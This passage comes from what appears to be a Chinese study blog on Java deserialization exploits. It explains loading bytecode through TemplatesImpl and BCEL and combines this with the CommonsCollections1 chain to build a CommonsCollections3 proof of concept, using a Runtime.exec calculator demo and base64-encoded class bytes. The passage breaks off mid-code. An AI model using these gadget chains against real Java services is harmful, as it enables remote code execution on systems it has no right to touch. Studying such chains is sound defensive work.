data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>dtm<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DTMAxisIterator</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>serializer<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SerializationHandler</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloTemplatesImpl</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractTranslet</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DOM</span> document<span class=\"token punctuation\">,</span> <span class=\"token class-name\">SerializationHandler</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> handlers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransletException</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DOM</span> document<span class=\"token punctuation\">,</span> <span class=\"token class-name\">DTMAxisIterator</span> iterator<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">SerializationHandler</span> handler<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransletException</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">HelloTemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello TemplatesImpl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"怎么转换java-文件为字节码jdk8\"><a class=\"anchor\" href=\"#怎么转换java-文件为字节码jdk8\">#</a> 怎么转换 java 文件为字节码（jdk8）：</h3>\n<pre><code>先javac一下（先确认是不是jdk8）（javac 文件名.java）\nPS C:\\Users\\86182\\IdeaProjects\\ACC_go\\src\\main\\java&gt; certutil -encode zijiema\\abstractTranslet.class out.b64\nInput Length = 906\nOutput Length = 1302\nCertUtil: -encode command completed successfully.\n在同目录下找到这个out.b64文件\n又有一个报错：不能解析为一个命令什么的：（用完整路径把）\nC:\\Users\\86182\\IdeaProjects\\ACC_go\\src\\main\\java&gt;C:\\Windows\\System32\\certutil.exe -encode zijiema\\abstractTranslet.class out_cnm.b64\nInput Length = 1100\nOutput Length = 1570\nCertUtil: -encode command completed successfully.\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504102021576.png\" alt=\"image-20250410202153320\" /></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504102031330.png\" alt=\"image-20250410203101160\" /></p>\n<p>这样就从<strong>字节码</strong>中<strong>获取对象</strong>，这个对象继承了<strong> AbstractTranslet</strong> 类，并在构造函数里插入<strong> Hello</strong> 的输出。将其编译成字节码，即可被 TemplatesImpl 执行了：</p>\n<p>在多个 Java 反序列化利用链，以及<strong> fastjson</strong>、<strong>jackson</strong> 的漏洞中，都曾出现过 <strong>TemplatesImpl</strong> 的身影，这</p>\n<p>个系列后文中仍然会再次见到它的身影。</p>\n<h3 id=\"利用bcel-classloader加载字节码\"><a class=\"anchor\" href=\"#利用bcel-classloader加载字节码\">#</a> 利用 BCEL ClassLoader 加载字节码</h3>\n<p>在本文第一节中，所有能够恢复成一个类并在 JVM 虚拟机里架子啊的字节序列，都在我们的探讨范围呢 i.suoyi，bcel 字节码也必然在我们的讨论范围内，且占据着比较重要的地位.</p>\n<p>BCEL 的全名应该是 Apache Commons BCEL, 属于 Apache Commons 项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 java 内部对于 JAXP 的实现，所以 BCEL 也被包含了 JDK 的原生库中。</p>\n<p>参考连接：[《BCEL ClassLoader 去哪了》](<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2hlcmUtaXMtYmNlbC1jbGFzc2xvYWRlci5odG1s\">BCEL ClassLoader 去哪了 | 离别歌</span>)</p>\n<p>我们可以通过 BCEL 提供的两个类 Repository 和 Utility 来利用：Repository 用于将一个 Java Class 先转换成原生字节码，当然这里也可以直接使用 javac 命令来编译 java 文件生成字节码；utility 用于将原生的</p>\n<p>字节码转黄成 BCEL 格式的字节码：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">zijiema</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>bcel<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>classfile<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JavaClass</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>bcel<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>classfile<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Utility</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>bcel<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Repository</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">hello<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Hello</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloBCEL</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">JavaClass</span> cls <span class=\"token operator\">=</span> <span class=\"token class-name\">Repository</span><span class=\"token punctuation\">.</span><span class=\"token function\">lookupClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Hello</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token class-name\">String</span> code <span class=\"token operator\">=</span> <span class=\"token class-name\">Utility</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504102050879.png\" alt=\"image-20250410205048767\" /></p>\n<p>而 BCEL ClassLoader 用于加载这串特殊的 “字节码”，并可以执行其中的代码：但是好像在 java8u251 的更新中被移除了，所以无法读出来，抽象，详情可参考 p 神：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2hlcmUtaXMtYmNlbC1jbGFzc2xvYWRlci5odG1s\">BCEL ClassLoader 去哪了 | 离别歌</span></p>\n<h3 id=\"为什么需要commonscollections3\"><a class=\"anchor\" href=\"#为什么需要commonscollections3\">#</a> 为什么需要 CommonsCollections3</h3>\n<p>上面我们已经讲了 cc1 链了，还有上面的字节码的 encode 和 decode，我们可以结合这两者进行执行字节码的 loadClass 新建对象</p>\n<p>TemplateImpl 是一个可以加载字节码的类，通过调用其 newTransformer () 方法，即可执行这段字节码的类构造器。那么</p>\n<p>我们是否可以在反序列化漏洞中，利用这个特性来执行任意代码呢？</p>\n<p>想一下之前的 cc1 链的简单的 demo：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Transformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ChainedTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ConstantTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvokerTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransformedMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Map</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CommonCollections1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> <span class=\"token class-name\">Transformer</span> transformerChain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> <span class=\"token class-name\">Map</span> innerMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> <span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>transformerChain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> outerMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"xxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们又学到了如何利用 TemplatesImpl 执行字节码：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// source: bytecodes/HelloTemplateImpl.java</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>\"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEA</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCm</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29y</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token class-name\">Zy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2Fw</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token class-name\">YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxp</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>bml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAb</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token class-name\">DAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwB</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token class-name\">AEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFj</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>dFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5z</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token class-name\">ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token class-name\">OylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsA</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token class-name\">AAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwA</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token class-name\">AQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwA</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token class-name\">DwABABAAAAACABE</span><span class=\"token operator\">=</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"HelloTemplatesImpl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>obj<span class=\"token punctuation\">.</span><span class=\"token function\">newTransformer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>我们知道的 cc1 链：<strong>ChainedTransformer</strong> 依次执行数组内的类，前一个回调的结果，作为后一个回调的参数传入，而<strong> ConstantTransformer</strong> 这个会返回我传入那个类，如何我传入 TemplateImpl 这个类，然后再用再在后面在一个 newTransformer 方法他不就炸了吗，我就可以直接通过 cc1 链运行我第二个代码的东西，所以 cc1 链中的东西都不用去怎么改，只要修改</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newTransformer\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>完整的 poc 就是：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>trax<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TemplatesImpl</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>trax<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransformerFactoryImpl</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ChainedTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ConstantTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvokerTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransformedMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Transformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Base64</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span 